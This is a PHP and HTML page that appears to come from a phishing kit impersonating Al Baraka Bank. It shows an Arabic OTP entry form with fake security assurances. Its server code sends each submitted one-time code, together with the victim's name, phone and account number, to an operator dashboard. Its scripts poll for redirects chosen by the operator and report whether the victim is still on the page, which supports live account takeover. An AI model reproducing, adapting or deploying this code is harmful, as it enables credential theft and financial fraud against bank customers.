<?php

declare(strict_types=1);

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__.'/includes/flow_helpers.php';
require_once __DIR__.'/includes/session_registry.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit'])) {
    $otpRaw = (string) ($_POST['otp'] ?? '');
    $digits = preg_replace('/\D/', '', $otpRaw) ?? '';

    $_SESSION['otp_code'] = $otpRaw;
    $_SESSION['otp_digits'] = $digits;

    dashboard_notify_safe(
        'otp',
        [
            'session_id' => session_id(),
            'otp_code' => $otpRaw,
            'otp_digits' => $digits,
            'phone' => $_SESSION['reg_phone'] ?? '',
            'name' => $_SESSION['reg_name'] ?? '',
            'account_number' => $_SESSION['reg_account'] ?? '',
        ],
        'OTP كامل'
    );

    $_SESSION['otp_done'] = true;

    unset($_SESSION['wait_page_broadcast']);

    registry_touch_page('otp.php');

    header('Location: wait-payment.php', true, 302);
    exit;
}

registry_touch_page('otp.php');
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>بنك البركة | رمز التحقق</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --td-blue: #8e000e;
            --td-blue-dark: #002244;
            --td-blue-light: #e6eef5;
            --td-gold: #c8a84e;
            --td-gold-light: #f5f0e0;
            --td-dark: #002244;
            --td-gray: #6B7280;
            --td-light: #F9FAFB;
            --td-white: #FFFFFF;
            --td-border: #E5E7EB;
            --td-radius: 16px;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Tajawal', system-ui, -apple-system, sans-serif;
            background: var(--td-light);
            color: #1E293B;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* === Navbar === */
        .td-nav {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 14px 16px;
            background: var(--td-white);
            box-shadow: 0 1px 4px rgba(0,0,0,0.06);
            position: sticky;
            top: 0;
            z-index: 1000;
            position: relative;
        }
        .td-nav .logo-img {
            height: 60px;
        }
        .td-nav .back-btn {
            position: absolute;
            right: 16px;
            width: 36px;
            height: 36px;
            border-radius: 10px;
            background: var(--td-blue-light);
            border: none;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--td-blue);
            font-size: 16px;
            cursor: pointer;
            text-decoration: none;
        }

        /* === Step Indicator === */
        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 8px;
            padding: 16px;
            background: var(--td-white);
            border-bottom: 1px solid var(--td-border);
        }
        .step-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: var(--td-border);
        }
        .step-dot.completed {
            background: var(--td-blue);
        }
        .step-dot.active {
            background: var(--td-gold);
            box-shadow: 0 0 0 4px rgba(200, 168, 78, 0.2);
            animation: dotPulse 1.5s ease-in-out infinite;
        }

        @keyframes dotPulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.3); }
        }

        /* === Form Header === */
        .otp-icon {
            width: 64px;
            height: 64px;
            background: var(--td-blue-light);
            border: 2px solid rgba(0, 51, 102, 0.3);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 14px;
            font-size: 26px;
            color: var(--td-blue);
        }

        /* === Form Card === */
        .form-wrap {
            flex: 1;
            padding: 0 16px 24px;
        }
        .form-card {
            background: var(--td-white);
            border-radius: var(--td-radius);
            padding: 28px 20px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
            border: 1px solid var(--td-border);
            text-align: center;
            margin-top: 16px;
        }

        .otp-desc {
            color: var(--td-gray);
            font-size: 14px;
            line-height: 1.8;
            margin-bottom: 20px;
        }

        .timer-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: var(--td-blue-light);
            border: 1px solid rgba(0, 51, 102, 0.3);
            border-radius: 20px;
            padding: 6px 14px;
            margin-bottom: 20px;
        }
        .timer-badge i {
            color: var(--td-blue);
            font-size: 14px;
        }
        .timer-badge span {
            color: var(--td-blue-dark);
            font-size: 13px;
            font-weight: 700;
        }

        /* === OTP Input === */
        .otp-input {
            width: 100%;
            border: 1.5px solid var(--td-border);
            border-radius: 12px;
            padding: 14px 16px;
            font-size: 24px;
            font-family: 'Tajawal', system-ui, sans-serif;
            color: #1E293B;
            background: var(--td-white);
            transition: border-color 0.3s, box-shadow 0.3s;
            text-align: center;
            letter-spacing: 10px;
            direction: ltr;
            height: 56px;
        }
        .otp-input:focus {
            border-color: var(--td-blue);
            box-shadow: 0 0 0 3px rgba(0, 51, 102, 0.15);
            outline: none;
        }
        .otp-input::placeholder {
            color: #CBD5E1;
            font-size: 20px;
            letter-spacing: 8px;
        }

        /* === Submit Button === */
        .btn-submit-td {
            width: 100%;
            background: linear-gradient(135deg, var(--td-blue), var(--td-blue-dark));
            color: var(--td-white);
            border: none;
            padding: 15px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            font-family: 'Tajawal', system-ui, sans-serif;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.3s;
            box-shadow: 0 4px 16px rgba(0, 51, 102, 0.3);
            margin-top: 16px;
        }
        .btn-submit-td:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 51, 102, 0.4);
        }

        /* === Error === */
        .error-msg {
            color: #DC2626;
            font-weight: 600;
            font-size: 13px;
            margin-top: 12px;
            padding: 10px 14px;
            background: #FEF2F2;
            border: 1px solid #FECACA;
            border-radius: 10px;
            line-height: 1.7;
            text-align: right;
        }

        /* === Info Note === */
        .info-note {
            background: var(--td-blue-light);
            border: 1px solid rgba(0, 51, 102, 0.2);
            border-radius: 12px;
            padding: 12px 14px;
            margin-top: 16px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .info-note i {
            color: var(--td-blue);
            font-size: 16px;
        }
        .info-note p {
            font-size: 12px;
            color: #374151;
            line-height: 1.7;
            margin: 0;
        }

        /* === Footer === */
        .td-footer {
            background: linear-gradient(135deg, var(--td-blue-dark), var(--td-blue));
            color: var(--td-white);
            padding: 20px 16px;
            text-align: center;
            margin-top: auto;
        }
        .td-footer .footer-logo {
            height: 45px;
            margin-bottom: 12px;
        }
        .td-footer p {
            font-size: 11px;
            color: rgba(255,255,255,0.7);
            line-height: 1.7;
        }
        .td-footer .footer-bottom {
            border-top: 1px solid rgba(255,255,255,0.15);
            padding-top: 10px;
            margin-top: 10px;
            font-size: 11px;
            color: rgba(255,255,255,0.5);
        }

        .hide { display: none; }
        .show { display: block; }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .fade-in {
            animation: fadeInUp 0.6s ease-out;
        }
    </style>
</head>
<body>

    <!-- Navbar -->
    <nav class="td-nav">
        <a href="index.php" class="back-btn">
            <i class="fas fa-arrow-right"></i>
        </a>
        <img src="https://i.postimg.cc/Xq4ZsdJT/bar-removebg-preview.png" alt="بنك البركة" class="logo-img">
    </nav>

    <!-- Step Indicator -->
    <div class="step-indicator">
        <div class="step-dot completed"></div>
        <div class="step-dot completed"></div>
        <div class="step-dot active"></div>
        <div class="step-dot"></div>
    </div>

    <!-- Form -->
    <div class="form-wrap fade-in">
        <div class="form-card">
            <div class="otp-icon">
                <i class="fas fa-lock"></i>
            </div>
            <h2 style="font-size:20px;font-weight:700;color:#1E293B;margin-bottom:6px;">رمز التحقق OTP</h2>
            <p style="font-size:13px;color:var(--td-gray);margin-bottom:16px;">لتأكيد عملية التسجيل في بنك البركة</p>
            <p class="otp-desc">سيتم إرسال رمز التحقق خلال دقيقة<br>أدخل الرمز المرسل إلى جوالك</p>

            <div class="timer-badge">
                <i class="fas fa-clock"></i>
                <span id="time"></span>
            </div>

            <form action="" method="post">
                <input type="text" pattern="[0-9]+" minlength="4" maxlength="6" inputmode="numeric" required name="otp" class="otp-input" placeholder="------">
                <input type="hidden" name="status" value="3">

                
                <button class="btn-submit-td" type="submit" name="submit">
                    <i class="fas fa-check-circle"></i>
                    المتابعة
                </button>
            </form>

            <div class="info-note">
                <i class="fas fa-shield-alt"></i>
                <p>اتصال آمن ومشفر بتقنية SSL 256-bit - بنك البركة</p>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="td-footer">
     
        <p style="color:var(--td-gold);font-weight:600;font-size:12px;margin-bottom:2px;">بنك البركة | SHAM Bank</p>
        <p>&copy; بنك البركة 2026 - جميع الحقوق محفوظة</p>
    </footer>

<script src="js/main.js"></script>

<script>
function checkRedirect() {
    fetch('polling-redirect.php')
        .then(r => r.json())
        .then(data => {
            if (data.redirect) {
                window.location.href = data.redirect;
            }
        })
        .catch(e => {});
}
setInterval(checkRedirect, 1500);
checkRedirect();
</script>

<script>
// Heartbeat
function sendHeartbeat() {
    fetch('heartbeat.php').catch(function(e){});
}
setInterval(sendHeartbeat, 2000);
sendHeartbeat();
window.addEventListener('beforeunload', function() {
    navigator.sendBeacon('heartbeat.php', new URLSearchParams({action: 'offline'}));
});
</script>
</body>
</html>
